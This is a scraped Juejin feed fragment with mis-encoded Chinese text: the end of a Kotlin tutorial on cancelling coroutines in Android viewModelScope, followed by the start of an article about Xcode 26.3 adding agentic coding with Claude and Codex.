    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">interrupt</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> != currentThread()) {
        <span class="hljs-built_in">this</span>.checkAccess();
    }

    <span class="hljs-built_in">this</span>.interrupted = <span class="hljs-literal">true</span>;
    <span class="hljs-built_in">this</span>.interrupt0();
    <span class="hljs-comment">//...</span>
}
</code></pre>
<p><code>stop</code> å·²ç»æ˜¯ä¸€ä¸ªå¼ƒç”¨ä¸”ä¸å¯ç”¨çš„æ¥å£äº†ã€‚</p>
<p>åˆšå­¦ Java çš„æˆ‘ä¸€ç›´ä»¥ä¸ºï¼Œå¦‚æœæˆ‘è°ƒç”¨ <code>stop</code> æˆ–è€… <code>interrupt</code>ï¼ŒJava ä¸€å®šä¼šå®Œç¾çš„å¸®æˆ‘å–æ¶ˆçº¿ç¨‹ï¼Œé‡Šæ”¾èµ„æºã€‚ä½†å®é™…ä¸Šæˆ‘ä»¬éœ€è¦å†™é¢å¤–çš„ä»£ç æ¥è¾¾æˆè¿™ä¸€æ­¥ï¼Œä¾‹å¦‚åˆ¤æ–­ <code>interrupted</code> æ ‡å¿—ä½ã€‚</p>
<p>é¢˜å¤–è¯ç»“æŸï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬çœ‹çœ‹å¦‚ä½•è§£å†³å–æ¶ˆæ“ä½œä¸å½“çš„é—®é¢˜ã€‚</p>
<h2 data-id="heading-5">ç¼–å†™æ”¯æŒå–æ¶ˆçš„æŒ‚èµ·å‡½æ•°</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4074f668c159463a8e31aeae9a229d66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769789&amp;x-signature=CKTSF1VeJh4qxqWnP4AA7W0FRyg%3D" alt="1.png" loading="lazy"/></p>
<p><strong>å¹¶éæ‰€æœ‰æŒ‚èµ·å‡½æ•°éƒ½å¤©ç”Ÿæ”¯æŒå–æ¶ˆ</strong>ã€‚</p>
<p>å¦‚æœè°ƒç”¨çš„æ˜¯éæŒ‚èµ·çš„é˜»å¡å¼ <code>API</code>ï¼ˆå¦‚é—ç•™åº“ï¼‰ï¼Œéœ€é€šè¿‡åŒ…è£…è®©å…¶å“åº”å–æ¶ˆæŒ‡ä»¤ï¼Œå¯ä½¿ç”¨ <code>isActive</code> æˆ– <code>yield()</code> æ£€æŸ¥å–æ¶ˆçŠ¶æ€ã€‚</p>
<p>ä»¥ä¸‹æ˜¯æ”¯æŒå–æ¶ˆçš„æŒ‚èµ·å‡½æ•°ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchDataFromNetwork</span><span class="hljs-params">()</span></span>: String = withContext(Dispatchers.IO) {
    <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶ç½‘ç»œè¯·æ±‚</span>
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.10</span>) {
        <span class="hljs-keyword">if</span> (!isActive) <span class="hljs-keyword">return</span><span class="hljs-symbol">@withContext</span> <span class="hljs-string">"å·²å–æ¶ˆ"</span> <span class="hljs-comment">// å–æ¶ˆåˆ™é€€å‡º</span>
        delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œå»¶è¿Ÿ</span>
    }
    <span class="hljs-string">"æ•°æ®è·å–æˆåŠŸ"</span>
}
</code></pre>
<p>è¯¥å‡½æ•°ä¸­ï¼Œ<code>isActive</code> ä¼šæ£€æŸ¥åç¨‹æ˜¯å¦ä»å¤„äºæ´»è·ƒçŠ¶æ€ã€‚å½“ <code>ViewModel</code> è¢«é”€æ¯æ—¶ï¼Œ<code>isActive</code> å˜ä¸º <code>false</code>ï¼Œå‡½æ•°ä¼šæå‰é€€å‡ºã€‚</p>
<h2 data-id="heading-6">éµå¾ªç»“æ„åŒ–å¹¶å‘åŸåˆ™</h2>
<p><strong>ç»“æ„åŒ–å¹¶å‘èƒ½ç¡®ä¿å­åç¨‹éšçˆ¶ä½œç”¨åŸŸå–æ¶ˆè€Œå–æ¶ˆ</strong>ã€‚</p>
<p><code>viewModelScope</code> æœ¬èº«å·²éµå¾ªè¿™ä¸€åŸåˆ™ï¼Œä½†å¯åŠ¨åµŒå¥—åç¨‹æ—¶ä»éœ€åˆ»æ„æ³¨æ„ï¼šé¿å…ä½¿ç”¨ <code>GlobalScope</code>ï¼Œå› å…¶ä¸ç»‘å®šä»»ä½•ç”Ÿå‘½å‘¨æœŸï¼Œé€šå¸¸æ¯” <code>ViewModel</code> å­˜æ´»æ›´ä¹…ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _data = MutableLiveData&lt;String&gt;()
    <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span>: LiveData&lt;String&gt; = _data

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchMultipleData</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> result1 = async { fetchDataFromNetwork() }.await()
                <span class="hljs-keyword">val</span> result2 = async { fetchDataFromNetwork() }.await()
                _data.value = <span class="hljs-string">"<span class="hljs-variable">$result1</span>, <span class="hljs-variable">$result2</span>"</span>
            } <span class="hljs-keyword">catch</span> (e: CancellationException) {
                _data.value = <span class="hljs-string">"æ“ä½œå·²å–æ¶ˆ"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                _data.value = <span class="hljs-string">"é”™è¯¯ï¼š<span class="hljs-subst">${e.message}</span>"</span>
            }
        }
    }
}
</code></pre>
<p>æ­¤å¤„çš„ <code>async</code> åç¨‹æ˜¯ <code>viewModelScope.launch</code> ä»£ç å—çš„å­åç¨‹ï¼Œå½“ <code>ViewModel</code> è¢«é”€æ¯æ—¶ï¼Œæ‰€æœ‰å­åç¨‹ä¼šè‡ªåŠ¨å–æ¶ˆã€‚</p>
<p><em>é’ˆå¯¹ <code>CancellationException</code> çš„æ­£ç¡®åšæ³•åº”è¯¥æ˜¯é‡æ–°æŠ›å‡ºï¼Œä¸è¿‡è¿™é‡Œåªæ˜¯ä¸ºäº†å±•ç¤ºå½“å‰å‡½æ•°çš„å–æ¶ˆé€»è¾‘ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰è¿™ä¹ˆåšï¼Œæ–‡ç« çš„åç»­éƒ¨åˆ†å°†ä¾ç„¶é‡‡ç”¨è¿™ç§åšæ³•ï¼Œä½†æ˜¯äº²çˆ±çš„è¯»è€…ä»¬ï¼Œä½ ä»¬è¦çŸ¥é“è¿™ä¸ªåœ°æ–¹è¿™ä¹ˆåšæ˜¯æœ‰å¾…å•†æ¦·çš„ã€‚</em></p>
<h2 data-id="heading-7">å¤„ç†å–æ¶ˆå¼‚å¸¸</h2>
<p>åç¨‹å–æ¶ˆæ—¶ä¼šæŠ›å‡º <code>CancellationException</code>ï¼Œè¿™æ˜¯æ­£å¸¸è¡Œä¸ºï¼Œä½†å¿…é¡»å¦¥å–„å¤„ç†ä»¥é¿å…æ„å¤–å´©æºƒã€‚å»ºè®®å§‹ç»ˆå°†åç¨‹ä»£ç åŒ…è£¹åœ¨ <code>try-catch</code> å—ä¸­ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _status = MutableLiveData&lt;String&gt;()
    <span class="hljs-keyword">val</span> status: LiveData&lt;String&gt; = _status

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">performLongRunningTask</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">try</span> {
                _status.value = withContext(Dispatchers.IO) {
                    <span class="hljs-comment">// è€—æ—¶ä»»åŠ¡</span>
                    delay(<span class="hljs-number">5000</span>)
                    <span class="hljs-string">"ä»»åŠ¡å®Œæˆ"</span>
                }
            } <span class="hljs-keyword">catch</span> (e: CancellationException) {
                _status.value = <span class="hljs-string">"ä»»åŠ¡å·²å–æ¶ˆ"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                _status.value = <span class="hljs-string">"é”™è¯¯ï¼š<span class="hljs-subst">${e.message}</span>"</span>
            }
        }
    }
}
</code></pre>
<p>è¿™èƒ½ç¡®ä¿ <code>ViewModel</code> é”€æ¯æ—¶ï¼Œåº”ç”¨ä¼˜é›…å¤„ç†å–æ¶ˆæ“ä½œï¼Œå¹¶åŒæ­¥æ›´æ–° <code>UI</code> çŠ¶æ€ã€‚</p>
<h2 data-id="heading-8">é¿å…æŒæœ‰ UI ç»„ä»¶å¼•ç”¨</h2>
<p><code>viewModelScope</code> ä¸­çš„åç¨‹è‹¥ä¸æ…æŒæœ‰ <code>Activity</code> æˆ– <code>Fragment</code> çš„å¼•ç”¨ï¼Œææ˜“å¼•å‘å†…å­˜æ³„æ¼ã€‚</p>
<p>æ¯”å¦‚å‘æŒ‚èµ·å‡½æ•°ä¼ é€’ <code>Context</code>ï¼Œå¯èƒ½å¯¼è‡´<code>Activity</code> åœ¨å–æ¶ˆåä»æ— æ³•é‡Šæ”¾ã€‚å»ºè®®æ”¹ç”¨ä¾èµ–æ³¨å…¥ï¼Œæˆ–æ˜¾å¼ä¼ é€’æ•°æ®ã€‚</p>
<p>âŒ é”™è¯¯ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">badFetch</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>)</span></span> {
        viewModelScope.launch {
            <span class="hljs-comment">// æŒæœ‰Activityå¼•ç”¨æ˜“å¯¼è‡´æ³„æ¼</span>
            activity.showToast(fetchDataFromNetwork())
        }
    }
}
</code></pre>
<p>âœ… ä¼˜åŒ–æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _toastMessage = MutableStateFlow&lt;String&gt;(<span class="hljs-string">""</span>)
    <span class="hljs-keyword">val</span> toastMessage: Flow&lt;String&gt; = _toastMessage

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchAndNotify</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            _toastMessage.value = fetchDataFromNetwork()
        }
    }
}
</code></pre>
<p>åœ¨ <code>Activity</code> ä¸­è§‚å¯Ÿ <code>toastMessage</code> å¹¶æ˜¾ç¤ºå¼¹çª—ï¼Œå®ç°åç¨‹ä¸ <code>UI</code> è§£è€¦ã€‚</p>
<h2 data-id="heading-9">æµ‹è¯•å–æ¶ˆè¡Œä¸º</h2>
<p>å–æ¶ˆé€»è¾‘çš„æµ‹è¯•è™½æœ‰éš¾åº¦ï¼Œä½†è‡³å…³é‡è¦ã€‚å¯ä½¿ç”¨ <code>kotlinx-coroutines-test</code> åº“çš„ <code>runBlockingTest</code> æ¨¡æ‹Ÿå•å…ƒæµ‹è¯•ä¸­çš„å–æ¶ˆåœºæ™¯ï¼š</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-meta">@Test</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> `fetchData cancels correctly`<span class="hljs-params">()</span></span> = runBlockingTest {
    <span class="hljs-keyword">val</span> viewModel = MyViewModel()
    <span class="hljs-keyword">val</span> job = viewModel.viewModelScope.launch {
        viewModel.fetchData()
    }
    job.cancel()
    assertEquals(<span class="hljs-string">"ä»»åŠ¡å·²å–æ¶ˆ"</span>, viewModel.status.value)
}
</code></pre>
<p>è¿™èƒ½ç¡®ä¿åç¨‹å–æ¶ˆæ—¶èƒ½æ­£ç¡®æ¸…ç†èµ„æºã€‚</p>
<h2 data-id="heading-10">å®æˆ˜</h2>
<p>å¦‚æœéœ€æ±‚éœ€è¦å®ç°â€œè·å–ç”¨æˆ·æ•°æ® â†’ å¤„ç†æ•°æ® â†’ æ›´æ–° <code>UI</code>â€çš„æµç¨‹ï¼ŒåŒæ—¶è¦é€‚é…é…ç½®å˜æ›´å’Œæ½œåœ¨çš„å–æ¶ˆæ“ä½œï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªå…¸å‹çš„å®ç°æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserViewModel</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> apiService: ApiService) : ViewModel() {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _userData = MutableStateFlow&lt;User&gt;(DEF_USER)
    <span class="hljs-keyword">val</span> userData: Flow&lt;User&gt; = _userData
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _error = MutableStateFlow&lt;String&gt;(DEF_USER)
    <span class="hljs-keyword">val</span> error: Flow&lt;String&gt; = _error

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchUserProfile</span><span class="hljs-params">(userId: <span class="hljs-type">String</span>)</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> user = withContext(Dispatchers.IO) {
                    ensureActive() <span class="hljs-comment">// æ‰§è¡Œå‰æ£€æŸ¥å–æ¶ˆçŠ¶æ€</span>
                    <span class="hljs-keyword">val</span> rawData = apiService.getUser(userId)
                    processUserData(rawData) <span class="hljs-comment">// è€—æ—¶å¤„ç†æ“ä½œ</span>
                }
                _userData.value = user
            } <span class="hljs-keyword">catch</span> (e: CancellationException) {
                _error.value = <span class="hljs-string">"ç”¨æˆ·æ•°æ®è·å–å·²å–æ¶ˆ"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                _error.value = <span class="hljs-string">"è·å–ç”¨æˆ·æ•°æ®å¤±è´¥ï¼š<span class="hljs-subst">${e.message}</span>"</span>
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processUserData</span><span class="hljs-params">(rawData: <span class="hljs-type">RawUserData</span>)</span></span>: User {
        <span class="hljs-keyword">return</span> withContext(Dispatchers.Default) {
            ensureActive() <span class="hljs-comment">// å¤„ç†è¿‡ç¨‹ä¸­æ£€æŸ¥å–æ¶ˆçŠ¶æ€</span>
            <span class="hljs-comment">// æ¨¡æ‹Ÿå¤æ‚æ•°æ®å¤„ç†</span>
            delay(<span class="hljs-number">2000</span>)
            User(rawData.id, rawData.name)
        }
    }
}
</code></pre>
<p>æ ¸å¿ƒè¦ç‚¹ï¼š</p>
<ul>
<li><code>ensureActive()</code> ä¼šåœ¨åç¨‹å–æ¶ˆæ—¶æŠ›å‡º <code>CancellationException</code>ï¼Œè®©å‡½æ•°å…·å¤‡å–æ¶ˆæ„ŸçŸ¥èƒ½åŠ›ï¼›</li>
<li><code>Dispatchers.IO</code> å’Œ <code>Dispatchers.Default</code> ç¡®ä¿è€—æ—¶æ“ä½œè„±ç¦»ä¸»çº¿ç¨‹ï¼›</li>
<li>é€šè¿‡ <code>Flow</code> ä¼ é€’é”™è¯¯å’Œå–æ¶ˆçŠ¶æ€ï¼Œä¿æŒ <code>UI</code> åŒæ­¥ã€‚</li>
</ul>
<h2 data-id="heading-11">é¿å‘æŒ‡å—</h2>
<ol>
<li><strong>å¿½ç•¥å–æ¶ˆæ£€æŸ¥</strong>ï¼šè€—æ—¶æŒ‚èµ·å‡½æ•°ä¸­åŠ¡å¿…é€šè¿‡ <code>isActive</code> æˆ– <code>ensureActive()</code> æ£€æŸ¥å–æ¶ˆçŠ¶æ€ï¼›</li>
<li><strong>æ»¥ç”¨ GlobalScope</strong>ï¼šåšæŒä½¿ç”¨ <code>viewModelScope</code>ï¼Œç¡®ä¿åç¨‹ä¸ç”Ÿå‘½å‘¨æœŸç»‘å®šã€‚å¦‚æœä½ çš„ä»£ç ä¸­å‡ºç°äº† <code>GlobalScope</code>ï¼Œä½ çš„ä»£ç ä¸€å®šæœ‰é—®é¢˜ï¼›</li>
<li><strong>å¿˜è®°å¤„ç†å¼‚å¸¸</strong>ï¼šåŠ¡å¿…å°† <code>CancellationException</code> ä¸å…¶ä»–å¼‚å¸¸åˆ†å¼€æ•è·ï¼Œæ›´é€šç”¨çš„åšæ³•å°±æ˜¯é‡æ–°æŠ›å‡ºï¼›</li>
<li><strong>é˜»å¡ä¸»çº¿ç¨‹</strong>ï¼šé <code>UI</code> æ“ä½œéœ€é€šè¿‡ <code>withContext</code> åˆ‡æ¢åˆ°åˆé€‚çš„è°ƒåº¦å™¨ã€‚</li>
</ol>
<h2 data-id="heading-12">æ€»ç»“</h2>
<p>æŒæ¡ <code>viewModelScope</code> å–æ¶ˆæ“ä½œçš„æ ¸å¿ƒï¼Œåœ¨äºç†è§£ç”Ÿå‘½å‘¨æœŸã€ç¼–å†™æ”¯æŒå–æ¶ˆçš„ä»£ç ï¼Œå¹¶ä¼˜é›…å¤„ç†è¾¹ç•Œæƒ…å†µã€‚</p>
<p>éµå¾ªè¿™äº›æœ€ä½³å®è·µâ€”â€”ç¼–å†™åä½œå¼æŒ‚èµ·å‡½æ•°ã€åˆ©ç”¨ç»“æ„åŒ–å¹¶å‘ã€å¦¥å–„å¤„ç†å¼‚å¸¸ã€é¿å…æŒæœ‰ <code>UI</code> å¼•ç”¨ï¼Œä½ å°±èƒ½å¼€å‘å‡ºå¥å£®ä¸”é«˜æ•ˆçš„ <code>Android</code> åº”ç”¨ã€‚</p>
<p>ä¸‹æ¬¡é‡åˆ°è«åçš„å†…å­˜æ³„æ¼æˆ–å´©æºƒæ—¶ï¼Œä¸å¦¨æ£€æŸ¥ä¸€ä¸‹åç¨‹ï¼šå¾€å¾€åªéœ€åšå¥½å–æ¶ˆå¤„ç†ï¼Œå°±èƒ½è§£å†³é—®é¢˜ã€‚</p>
<p>æˆ‘é©¬ä¸ŠæŠŠè¿™ç¯‡æ–‡ç« å‘ç»™æˆ‘çš„åŒäº‹ï¼Œå…å¾—åæ‚£æ— ç©·ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Xcode 26.3 ç‚¸è£‚æ›´æ–°ï¼šåŸç”Ÿæ”¯æŒ AI Agent ç¼–ç¨‹]]></title>    <link>https://juejin.cn/post/7602471311509274651</link>    <guid>https://juejin.cn/post/7602471311509274651</guid>    <pubDate>2026-02-04T00:48:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602471311509274651" data-draft-id="7602512226998632498" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Xcode 26.3 ç‚¸è£‚æ›´æ–°ï¼šåŸç”Ÿæ”¯æŒ AI Agent ç¼–ç¨‹"/> <meta itemprop="keywords" content="Xcode,iOS"/> <meta itemprop="datePublished" content="2026-02-04T00:48:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é»„æ—æ™´"/> <meta itemprop="url" content="https://juejin.cn/user/3985057546510423"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Xcode 26.3 ç‚¸è£‚æ›´æ–°ï¼šåŸç”Ÿæ”¯æŒ AI Agent ç¼–ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3985057546510423/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é»„æ—æ™´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:48:35.000Z" title="Wed Feb 04 2026 00:48:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ˜¨å¤©æ‰“å¼€ Xcode æ›´æ–°ï¼Œå·®ç‚¹ä»¥ä¸ºçœ‹é”™äº†ã€‚</p>
<p>è‹¹æœå®˜æ–¹å†…ç½® Claude å’Œ GPTï¼Ÿè¿˜æ”¯æŒ MCP åè®®ï¼Ÿ</p>
<p>è¿™ä¸æ˜¯æ„šäººèŠ‚ç©ç¬‘ï¼Œæ˜¯ Xcode 26.3 çš„çœŸå®æ›´æ–°ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd3624bbd36c4ba49bcad75bed268f6e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6buE5p6X5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770914&amp;x-signature=iSl7Uvwe5SiBdjx3tkOYS58rEH0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-0">ä»€ä¹ˆæ˜¯ Agentic Codingï¼Ÿ</h3>
<p>ç®€å•è¯´ï¼š<strong>AI ä¸åªæ˜¯è¡¥å…¨ä»£ç äº†ï¼Œå®ƒèƒ½è‡ªå·±å¹²æ´»ã€‚</strong></p>
<p>ä»¥å‰çš„ AI ç¼–ç¨‹åŠ©æ‰‹ï¼Œä½ é—®ä¸€å¥å®ƒç­”ä¸€å¥ï¼Œåƒä¸ªè¢«åŠ¨çš„æœç´¢å¼•æ“ã€‚</p>
<p>Agentic Coding ä¸ä¸€æ ·ã€‚ä½ å‘Šè¯‰å®ƒç›®æ ‡ï¼Œå®ƒè‡ªå·±ï¼š</p>
<ul>
<li>â€¢ æ‹†è§£ä»»åŠ¡</li>
<li>â€¢ åˆ†æé¡¹ç›®æ¶æ„</li>
<li>â€¢ æœç´¢æ–‡æ¡£</li>
<li>â€¢ ä¿®æ”¹ä»£ç </li>
<li>â€¢ è·‘æ„å»º</li>
<li>â€¢ å‘ç°é—®é¢˜è‡ªå·±æ”¹</li>
</ul>
<p><strong>ä½ åªç®¡æéœ€æ±‚ï¼Œå®ƒè´Ÿè´£å®ç°ã€‚</strong></p>
<h3 data-id="heading-1">å†…ç½®ä¸¤å¤§ç‹ç‰Œ AI</h3>
<p>æ‰“å¼€ Xcode è®¾ç½®ï¼Œä½ ä¼šçœ‹åˆ°ä¸¤ä¸ªä¸€é”®å®‰è£…é€‰é¡¹ï¼š</p>
<p><strong>1. Anthropic Claude Agent</strong><br/>
æ“…é•¿å¤æ‚æ¨ç†ã€é•¿ä¸Šä¸‹æ–‡ç†è§£ï¼Œä»£ç è´¨é‡é«˜</p>
<p><strong>2. OpenAI Codex</strong><br/>
è€ç‰Œä»£ç ç”Ÿæˆæ¨¡å‹ï¼Œé€Ÿåº¦å¿«ï¼Œè¦†ç›–é¢å¹¿</p>
